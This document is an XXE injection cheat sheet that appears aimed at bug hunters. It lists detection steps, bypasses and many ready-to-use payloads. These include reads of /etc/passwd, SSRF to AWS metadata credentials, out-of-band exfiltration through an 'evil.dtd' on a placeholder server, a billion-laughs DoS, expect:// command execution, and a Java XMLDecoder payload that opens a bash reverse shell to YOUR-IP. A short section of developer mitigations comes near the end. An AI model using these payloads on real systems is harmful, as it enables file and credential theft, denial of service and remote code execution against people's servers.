## Overview

**XML External Entity (XXE)** is a vulnerability that exploits XML parsers when they process external entity references. Attackers can abuse this to:

- **Read local files** (LFI)
- **Trigger SSRF** (Server-Side Request Forgery)
- **Exfiltrate sensitive data**
- **Execute Denial of Service (DoS)**
- **Achieve RCE** in some cases (e.g., via PHP `expect://`)

XXE happens when XML parsers allow **DOCTYPE declarations** and **external entity resolution** without proper hardening.

---

## Where to Find XXE

Look for XML inputs in:

- **API endpoints** (SOAP, REST with XML body)
- **File uploads** (DOCX, XLSX, PPTX, SVG, PDF)
- **RSS/Atom feeds**
- **SAML authentication** (SSO integrations)
- **Content-Type switching** (JSON → XML)
- **Office document parsing** (unzip and inject into `.xml` files)
- **JMF/Print services** (network listeners on dedicated ports)

---

## Detection Steps

### Step 1: Basic Entity Test

Check if the parser resolves entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY test "VULNERABLE">]>
<data>&test;</data>
```

**✅ Expected:** Response contains "VULNERABLE"

---

### Step 2: External Entity Test

Try loading an external resource:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-COLLAB-SERVER.com">]>
<data>&xxe;</data>
```

**✅ Expected:** HTTP request received on your server

---

### Step 3: File Read Test

Attempt to read `/etc/passwd`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

**✅ Expected:** Content of `/etc/passwd` appears in response

---

## Exploitation Methods

### 🔹 1. Classic XXE (Direct File Read)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>
```

**Windows Example:**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
<foo>&xxe;</foo>
```

---

### 🔹 2. Base64-Encoded File Read (PHP Filter)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&xxe;</data>
```

**For index.php:**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<data>&xxe;</data>
```

---

### 🔹 3. SSRF via XXE

**Cloud Metadata (AWS EC2):**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<foo>&xxe;</foo>
```

**Internal Network Scan:**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.service:8080/secret">]>
<foo>&xxe;</foo>
```

---

### 🔹 4. Blind XXE (Out-of-Band Exfiltration)

**Step 1:** Host malicious DTD on your server (`evil.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%eval;
%exfil;
```

**Step 2:** Inject payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd"> %xxe;]>
<data>test</data>
```

**✅ Expected:** Your server receives `/etc/passwd` content in query string

---

### 🔹 5. Error-Based XXE (Blind)

**Malicious DTD (`error.dtd`):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Injection:**

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-SERVER/error.dtd"> %xxe;]>
<data>test</data>
```

**✅ Expected:** Error message reveals `/etc/passwd` content

---

### 🔹 6. Local DTD Repurposing (No Outbound)

**Find existing DTD** (common on GNOME systems):

```
/usr/share/yelp/dtd/docbookx.dtd
```

**Exploit:**

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;error;
'>
%local_dtd;
]>
<data>test</data>
```

---

### 🔹 7. XInclude Attack (No DOCTYPE Control)

When you can't modify DOCTYPE:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

### 🔹 8. SVG File Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

### 🔹 9. DOCX/XLSX/PPTX Injection

**Steps:**

1. Unzip the file: `unzip file.docx`
2. Edit `word/document.xml` (or `xl/workbook.xml`, `ppt/presentation.xml`)
3. Insert payload:

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://YOUR-SERVER">]>
<x>&xxe;</x>
```

4. Rezip: `zip -r file.docx *`

---

### 🔹 10. XXE in SOAP

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://YOUR-SERVER/"> %dtd;]><x/>]]>
  </foo>
</soap:Body>
```

---

## Bypasses

### 🔸 WAF Bypass: UTF-7 Encoding

Use [CyberChef UTF-7 recipe](https://gchq.github.io/CyberChef/#recipe=Encode_text\('UTF-7'\)) to encode:

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
```

---

### 🔸 WAF Bypass: HTML Entities

Encode payload with numeric entities:

```xml
<!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;...">]>
```

---

### 🔸 WAF Bypass: Base64 Data URI

```xml
<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]>
<foo/>
```

---

### 🔸 PHP Wrapper Alternative

Instead of `file://`, use:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

---

### 🔸 Java: Jar Protocol (Path Traversal)

```xml
<!ENTITY xxe SYSTEM "jar:http://YOUR-SERVER/archive.zip!/file.txt">
```

---

### 🔸 Content-Type Switch

Change `application/json` → `application/xml`:

**Before:**

```
POST /api
Content-Type: application/json

{"user":"admin"}
```

**After:**

```
POST /api
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>&xxe;</user>
```

---

## DoS Attacks

### Billion Laughs Attack

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos">
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

---

## Higher Impact Scenarios

### 🎯 RCE via PHP `expect://`

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<creds>
  <user>&xxe;</user>
</creds>
```

---

### 🎯 Java XMLDecoder RCE

```xml
<?xml version="1.0"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <array class="java.lang.String" length="3">
        <void index="0"><string>/bin/bash</string></void>
        <void index="1"><string>-c</string></void>
        <void index="2"><string>bash -i >& /dev/tcp/YOUR-IP/4444 0>&1</string></void>
      </array>
    </void>
  </object>
</java>
```

---

### 🎯 NTLM Hash Stealing (Windows)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://///YOUR-IP/share/file.txt">]>
<data>&xxe;</data>
```

**Capture with:** `Responder.py -I eth0 -v`

---

### 🎯 AWS Metadata Exploitation

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<data>&xxe;</data>
```

**Follow-up:** Extract role name → retrieve credentials

---

## Top 10 Modern Payloads

### 1. **Basic File Read**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

### 2. **PHP Filter Base64**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<data>&xxe;</data>
```

### 3. **Blind OOB (External DTD)**

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd"> %xxe;]>
<data>test</data>
```

### 4. **Error-Based (No Outbound)**

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/&#x25;file;&#x27;>">
  &#x25;eval; &#x25;error;
'>
%local_dtd;
]>
<data>x</data>
```

### 5. **SSRF to Cloud Metadata**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>
```

### 6. **XInclude (No DOCTYPE)**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 7. **SVG Upload**

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg><text x="0" y="16">&xxe;</text></svg>
```

### 8. **Java Jar Protocol**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://YOUR-SERVER/evil.zip!/evil.dtd">]>
<data>&xxe;</data>
```

### 9. **UTF-7 WAF Bypass**

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
<data>&xxe;</data>
```

### 10. **Python lxml Error-Based (libxml2 <2.13.8)**

```xml
<!DOCTYPE colors [
  <!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">
  <!ENTITY % config_hex '
    <!ENTITY % flag SYSTEM "file:///tmp/flag.txt">
    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">
  %eval;'>
  %local_dtd;
]>
<data>x</data>
```

---

## Mitigations

### For Developers

#### Java (DocumentBuilderFactory)

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Disable DOCTYPE
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Disable external entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Enable secure processing
dbf.setFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING, true);

// Extras
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

#### Python (lxml)

- Upgrade to **lxml ≥5.4.0** (libxml2 ≥2.13.8)
- Set `resolve_entities=False` and `load_dtd=False`
- Don't return raw parser errors to users

#### PHP

- Use `libxml_disable_entity_loader(true)`
- Set `LIBXML_NOENT` flag to `false`

---

### General Rules

✅ **Disable external entity resolution**  
✅ **Block DOCTYPE declarations if not needed**  
✅ **Use allow-lists for file/protocol access**  
✅ **Validate and sanitize XML inputs**  
✅ **Don't expose parser errors to users**

---

## Tools

- **[XXExploiter](https://github.com/luisfontes19/xxexploiter)** - Automated XXE scanner
- **[XXEinjector](https://github.com/enjoiz/XXEinjector)** - Advanced exploitation
- **[oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)** - Office file injector
- **[dtd-finder](https://github.com/GoSecure/dtd-finder)** - Find local DTDs

---

## Resources

- [PortSwigger XXE Labs](https://portswigger.net/web-security/xxe)
- [HackTricks XXE](https://book.hacktricks.xyz/pentesting-web/xxe)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [GoSecure XXE Workshop](https://gosecure.github.io/xxe-workshop/)

---

**🚀 Happy Hunting! Keep it simple, stay focused, and chain your findings.**